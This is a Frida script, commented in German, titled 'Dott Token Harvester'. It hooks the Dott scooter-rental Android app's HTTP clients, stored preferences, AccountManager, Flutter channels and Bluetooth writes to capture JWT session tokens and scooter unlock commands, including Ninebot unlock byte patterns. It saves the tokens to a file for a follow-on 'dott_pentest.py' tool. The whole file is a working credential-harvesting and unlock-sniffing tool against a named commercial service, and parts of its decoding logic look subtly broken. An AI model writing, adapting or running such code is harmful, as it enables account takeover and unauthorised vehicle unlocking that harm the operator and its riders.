/**
 * dott_token_harvest.js – Frida Script für Dott (com.ridedott.rider)
 * 
 * Extrahiert automatisch:
 *   - JWT-Token aus Authorization-Headern (OkHttp/Dio)
 *   - Token aus SharedPreferences (Flutter/Dart-Persistenz)
 *   - AccountManager-Tokens
 *   - Unlock-Tokens aus BLE-Kommunikation
 * 
 * Usage:
 *   frida -U -l dott_token_harvest.js -f com.ridedott.rider --no-pause
 *   # oder gegen laufende App:
 *   frida -U -l dott_token_harvest.js com.ridedott.rider
 */

'use strict';

// ============================================================
// KONFIGURATION
// ============================================================
const CONFIG = {
    AUTO_SAVE_TOKEN: true,
    TOKEN_FILE: '/sdcard/dott_token.txt',
    DUMP_ALL_HEADERS: false,
    HOOK_OKHTTP: true,
    HOOK_DIO: true,
    HOOK_SHARED_PREFS: true,
    HOOK_ACCOUNT_MANAGER: true,
    HOOK_BLE: true,
};

var capturedTokens = new Set();

// ============================================================
// HELPER
// ============================================================

function hexdump(buffer, length) {
    if (!buffer) return '';
    var bytes = [];
    var len = Math.min(buffer.length, length || buffer.length);
    for (var i = 0; i < len; i++) {
        bytes.push(('0' + buffer[i].toString(16)).slice(-2));
    }
    return bytes.join(' ');
}

function saveTokenToFile(token) {
    if (!CONFIG.AUTO_SAVE_TOKEN || !token) return;
    try {
        var f = new File(CONFIG.TOKEN_FILE, 'w');
        f.write(token);
        f.flush();
        f.close();
        console.log('[📁] Token gespeichert: ' + CONFIG.TOKEN_FILE);
    } catch (e) {
        console.warn('[!] File-Save fehlgeschlagen: ' + e);
    }
}

function extractJWTFromHeader(headerValue) {
    if (!headerValue) return null;
    
    // Bearer <token>
    var match = headerValue.match(/Bearer\s+([A-Za-z0-9\-_]+?\.[A-Za-z0-9\-_]+?\.[A-Za-z0-9\-_]+)/);
    if (match) return match[1];
    
    // Nur der reine JWT (3 Base64-Teile mit Punkten)
    match = headerValue.match(/^([A-Za-z0-9\-_]+)\.([A-Za-z0-9\-_]+)\.([A-Za-z0-9\-_]+)$/);
    if (match) return match[0];
    
    return null;
}

function decodeJWTPayload(jwt) {
    try {
        var parts = jwt.split('.');
        if (parts.length < 2) return null;
        
        // Base64url -> Base64
        var b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
        // Padding
        while (b64.length % 4) b64 += '=';
        
        var jsonStr = '';
        var bytes = Java.array('byte', b64);
        // Alternative: String.fromCharCode
        var decoded = '';
        for (var i = 0; i < bytes.length; i++) {
            decoded += String.fromCharCode(bytes[i]);
        }
        return JSON.parse(decoded);
    } catch (e) {
        return null;
    }
}

function reportToken(source, token) {
    if (!token || capturedTokens.has(token)) return;
    capturedTokens.add(token);
    
    var payload = decodeJWTPayload(token);
    var exp = payload ? payload.exp : '?';
    var sub = payload ? payload.sub : '?';
    var expDate = exp !== '?' ? new Date(exp * 1000).toISOString() : '?';
    
    console.log('');
    console.log('╔══════════════════════════════════════════════╗');
    console.log('║      🔑 JWT TOKEN CAPTURED                   ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ Source: ' + source.padEnd(37) + '║');
    console.log('║ Subject: ' + (sub || '?').padEnd(36) + '║');
    console.log('║ Expiry: ' + expDate.padEnd(37) + '║');
    console.log('║ Token: ' + token.substring(0, 50) + '...        ║');
    console.log('╚══════════════════════════════════════════════╝');
    console.log('');
    
    // Full token to stdout for piping
    console.log('[JWT_TOKEN] ' + token);
    
    // Auto-save to file
    saveTokenToFile(token);
}

// ============================================================
// HOOK 1: OkHttp3 interceptor (Standard Android HTTP)
// ============================================================

function hookOkHttp() {
    if (!CONFIG.HOOK_OKHTTP) return;
    
    var OkHttpClient;
    try {
        OkHttpClient = Java.use('okhttp3.OkHttpClient');
    } catch (e) {
        console.log('[i] OkHttp3 nicht gefunden, versuche okhttp...');
        try {
            OkHttpClient = Java.use('okhttp.OkHttpClient');
        } catch (e2) {
            console.log('[i] OkHttp nicht geladen (nicht in use)');
            return;
        }
    }
    
    console.log('[+] OkHttpClient gefunden – hooke Interceptor-Chain');
    
    // Hook newCall um Header zu lesen
    try {
        var OkHttpCall = Java.use('okhttp3.RealCall');
        OkHttpCall.execute.overload().implementation = function () {
            var request = this.request();
            if (request) {
                var headers = request.headers();
                if (headers) {
                    var authHeader = headers.get('Authorization');
                    if (authHeader) {
                        var token = extractJWTFromHeader(authHeader);
                        if (token) reportToken('OkHttp:execute', token);
                    }
                    var cookieHeader = headers.get('Cookie') || headers.get('X-Auth-Token');
                    if (cookieHeader) {
                        var t2 = extractJWTFromHeader(cookieHeader);
                        if (t2) reportToken('OkHttp:Cookie', t2);
                    }
                }
            }
            return this.execute();
        };
    } catch (e) {
        console.log('[i] RealCall.execute nicht hookbar: ' + e);
    }
    
    // Hook Interceptor.proceed für tiefere Einblicke
    try {
        var Interceptor = Java.use('okhttp3.Interceptor');
        var Chain = Java.use('okhttp3.Interceptor$Chain');
        
        Chain.proceed.overload('okhttp3.Request').implementation = function (request) {
            var headers = request.headers();
            if (headers) {
                var auth = headers.get('Authorization');
                if (auth) {
                    var token = extractJWTFromHeader(auth);
                    if (token) reportToken('OkHttp:Interceptor', token);
                }
            }
            return this.proceed(request);
        };
    } catch (e) {
        console.log('[i] Interceptor-Chain nicht hookbar: ' + e);
    }
}

// ============================================================
// HOOK 2: Flutter Dio HTTP Client
// ============================================================

function hookDio() {
    if (!CONFIG.HOOK_DIO) return;
    
    try {
        var Dio = Java.use('dio.Dio');
        console.log('[+] Dio (Flutter HTTP) gefunden');
        
        // Dio.options.headers enthalten oft den Auth-Header
        Dio.options.implementation = function () {
            var opts = this.options();
            if (opts) {
                try {
                    var headers = opts.headers.value;
                    if (headers) {
                        var hJson = JSON.parse(JSON.stringify(headers));
                        for (var key in hJson) {
                            if (key.toLowerCase().indexOf('authorization') !== -1 ||
                                key.toLowerCase().indexOf('token') !== -1) {
                                var t = extractJWTFromHeader(String(hJson[key]));
                                if (t) reportToken('Dio:Options', t);
                            }
                        }
                    }
                } catch (e) {}
            }
            return opts;
        };
    } catch (e) {
        // Kein Dio – Flutter nutzt oft dio, aber nicht zwingend
    }
}

// ============================================================
// HOOK 3: SharedPreferences (Token-Persistenz)
// ============================================================

function hookSharedPreferences() {
    if (!CONFIG.HOOK_SHARED_PREFS) return;
    
    try {
        var SharedPreferences = Java.use('android.content.SharedPreferences');
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        
        // putString – hier werden Tokens gespeichert
        Editor.putString.overload('java.lang.String', 'java.lang.String').implementation = function (key, value) {
            if (value) {
                var keyStr = key ? key.toString().toLowerCase() : '';
                var valStr = value.toString();
                
                // Token-relevante Keys
                var tokenKeys = ['token', 'jwt', 'auth', 'access_token', 'refresh_token', 
                                'dott_token', 'session_token', 'bearer',
                                'unlock_code', 'unlock_token', 'ride_token'];
                
                for (var i = 0; i < tokenKeys.length; i++) {
                    if (keyStr.indexOf(tokenKeys[i]) !== -1) {
                        var t = extractJWTFromHeader(valStr);
                        if (t) {
                            reportToken('SharedPrefs:' + keyStr, t);
                        } else if (valStr.length > 20 && valStr.length < 1000) {
                            // Könnte ein API-Key oder Unlock-Token sein
                            console.log('[📝] SharedPrefs: ' + keyStr + ' = ' + valStr.substring(0, 60));
                        }
                        break;
                    }
                }
            }
            return this.putString(key, value);
        };
        
        // getString – Token-Auslesen abfangen (nicht speichern, nur loggen)
        SharedPreferences.getString.overload('java.lang.String', 'java.lang.String').implementation = function (key, def) {
            var result = this.getString(key, def);
            var keyStr = key ? key.toString().toLowerCase() : '';
            
            if (result && (keyStr.indexOf('token') !== -1 || keyStr.indexOf('auth') !== -1 || keyStr.indexOf('jwt') !== -1)) {
                var t = extractJWTFromHeader(result.toString());
                if (t) reportToken('SharedPrefs:get:' + keyStr, t);
            }
            
            return result;
        };
        
        console.log('[+] SharedPreferences Token-Hooks aktiv');
    } catch (e) {
        console.log('[i] SharedPreferences nicht hookbar: ' + e);
    }
}

// ============================================================
// HOOK 4: AccountManager (falls Dott AccountManager nutzt)
// ============================================================

function hookAccountManager() {
    if (!CONFIG.HOOK_ACCOUNT_MANAGER) return;
    
    try {
        var AccountManager = Java.use('android.accounts.AccountManager');
        
        // getAuthToken – Haupt-Token-Abfrage
        AccountManager.getAuthToken.overload(
            'android.accounts.Account', 'java.lang.String', 
            'android.os.Bundle', 'boolean', 
            'android.accounts.AccountManagerCallback', 'android.os.Handler'
        ).implementation = function (account, authTokenType, options, notify, callback, handler) {
            console.log('[👤] AccountManager: getAuthToken für ' + 
                       (account ? account.name : '?') + ' type=' + authTokenType);
            return this.getAuthToken(account, authTokenType, options, notify, callback, handler);
        };
        
        // peekAuthToken – Token direkt lesen
        AccountManager.peekAuthToken.overload('android.accounts.Account', 'java.lang.String').implementation = function (account, authTokenType) {
            var result = this.peekAuthToken(account, authTokenType);
            if (result) {
                var t = extractJWTFromHeader(result.toString());
                if (t) reportToken('AccountManager:peek', t);
                else console.log('[👤] AccountManager Token (non-JWT): ' + result.substring(0, 40));
            }
            return result;
        };
        
        console.log('[+] AccountManager Hooks aktiv');
    } catch (e) {
        console.log('[i] AccountManager nicht nutzbar: ' + e);
    }
}

// ============================================================
// HOOK 5: BLE GATT – Unlock-Token-Sniffer
// ============================================================

function hookBLE() {
    if (!CONFIG.HOOK_BLE) return;
    
    try {
        var Gatt = Java.use('android.bluetooth.BluetoothGatt');
        var GattCallback = Java.use('android.bluetooth.BluetoothGattCallback');
        
        // writeCharacteristic – hier werden Unlock-Token gesendet
        Gatt.writeCharacteristic.overload('android.bluetooth.BluetoothGattCharacteristic').implementation = function (characteristic) {
            if (characteristic) {
                var value = characteristic.getValue();
                if (value) {
                    var uuid = characteristic.getUuid().toString().toLowerCase();
                    var hex = hexdump(value, 32);
                    
                    // Nordic UART TX (unlock commands)
                    if (uuid.indexOf('6e400002') !== -1 || uuid.indexOf('6e400003') !== -1) {
                        console.log('[📡] BLE WRITE to ' + uuid);
                        console.log('[📡] Hex: ' + hex);
                        
                        // ASCII decode versuchen
                        var ascii = '';
                        for (var i = 0; i < value.length; i++) {
                            var c = value[i];
                            if (c >= 32 && c < 127) ascii += String.fromCharCode(c);
                        }
                        if (ascii.length > 2) {
                            console.log('[📡] ASCII: ' + ascii);
                        }
                        
                        // Ninebot-Command erkennen (5aa503...)
                        if (hex.indexOf('5aa50320') !== -1 || hex.indexOf('5aa50310') !== -1) {
                            console.log('[🔓] NINEBOT UNLOCK/LOCK COMMAND ERKANNT!');
                        }
                    }
                    
                    // Standard Unlock Service
                    if (uuid.indexOf('fff1') !== -1 || uuid.indexOf('ffe1') !== -1) {
                        console.log('[🔓] Unlock-Characteristic Write: ' + hex);
                    }
                }
            }
            return this.writeCharacteristic(characteristic);
        };
        
        // onCharacteristicChanged – Notification empfangen (Antwort vom Scooter)
        GattCallback.onCharacteristicChanged.overload(
            'android.bluetooth.BluetoothGatt', 
            'android.bluetooth.BluetoothGattCharacteristic'
        ).implementation = function (gatt, characteristic) {
            if (characteristic) {
                var uuid = characteristic.getUuid().toString().toLowerCase();
                var value = characteristic.getValue();
                if (value && value.length > 0) {
                    var hex = hexdump(value, 32);
                    if (uuid.indexOf('6e400003') !== -1 || uuid.indexOf('ffe1') !== -1 || uuid.indexOf('fff2') !== -1) {
                        console.log('[📡] BLE NOTIFY ' + uuid + ': ' + hex);
                    }
                }
            }
            return this.onCharacteristicChanged(gatt, characteristic);
        };
        
        console.log('[+] BLE GATT Hooks aktiv');
    } catch (e) {
        console.log('[i] BLE-Hooks nicht geladen: ' + e);
    }
}

// ============================================================
// HOOK 6: Flutter/Dart SharedPreferences (via MethodChannel)
// ============================================================

function hookFlutterChannel() {
    try {
        var FlutterJNI = Java.use('io.flutter.embedding.engine.FlutterJNI');
        
        // Dispatch platform messages (MethodChannel)
        FlutterJNI.dispatchPlatformMessage.overload(
            'java.lang.String', 'java.nio.ByteBuffer', 'int', 'int'
        ).implementation = function (channel, buffer, offset, responseId) {
            var channelStr = channel ? channel.toString() : '';
            
            if (channelStr.indexOf('shared_preferences') !== -1 ||
                channelStr.indexOf('flutter_secure_storage') !== -1 ||
                channelStr.indexOf('auth') !== -1 ||
                channelStr.indexOf('token') !== -1) {
                
                console.log('[📱] Flutter Channel: ' + channelStr);
                
                // Buffer-Inhalt lesen (JSON)
                if (buffer) {
                    try {
                        var arr = Java.array('byte', []);
                        buffer.position(offset);
                        buffer.get(arr, 0, Math.min(buffer.remaining(), 4096));
                        var msg = '';
                        for (var i = 0; i < arr.length; i++) {
                            if (arr[i] !== 0) msg += String.fromCharCode(arr[i]);
                        }
                        if (msg.length > 5) {
                            console.log('[📱] Message: ' + msg.substring(0, 500));
                            
                            // Token extrahieren
                            var tokMatch = msg.match(/[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}/);
                            if (tokMatch) {
                                reportToken('Flutter:Channel', tokMatch[0]);
                            }
                        }
                    } catch (e) {}
                }
            }
            
            return this.dispatchPlatformMessage(channel, buffer, offset, responseId);
        };
        
        console.log('[+] Flutter MethodChannel Hook aktiv');
    } catch (e) {
        console.log('[i] FlutterJNI nicht gefunden (kein Flutter oder andere Version): ' + e);
    }
}

// ============================================================
// HOOK 7: Dart VM – Klassenvariablen auslesen (Advanced)
// ============================================================

function hookDartVM() {
    try {
        var DartExecutor = Java.use('io.flutter.embedding.engine.dart.DartExecutor');
        
        DartExecutor.executeDartCallback.overload(
            'io.flutter.embedding.engine.dart.DartExecutor$DartCallback'
        ).implementation = function (callback) {
            console.log('[🎯] Dart Callback registriert');
            return this.executeDartCallback(callback);
        };
    } catch (e) {
        // Nicht kritisch
    }
}

// ============================================================
// INIT
// ============================================================

function main() {
    console.log('');
    console.log('╔══════════════════════════════════════════════╗');
    console.log('║   🎣 Dott Token Harvester v2.0              ║');
    console.log('║   Target: com.ridedott.rider                ║');
    console.log('║   Frida: ' + (Frida.version || '?') + '                             ║');
    console.log('╚══════════════════════════════════════════════╝');
    console.log('');
    
    // Warte auf Java
    Java.perform(function () {
        console.log('[+] Java verfügbar – aktiviere Hooks...');
        
        hookOkHttp();
        hookDio();
        hookSharedPreferences();
        hookAccountManager();
        hookBLE();
        hookFlutterChannel();
        hookDartVM();
        
        console.log('[+] Alle Hooks aktiv. Warte auf Tokens...');
        console.log('[>] python3 dott_pentest.py --token $(cat /sdcard/dott_token.txt) --full');
        console.log('');
    });
}

setTimeout(main, 1000);
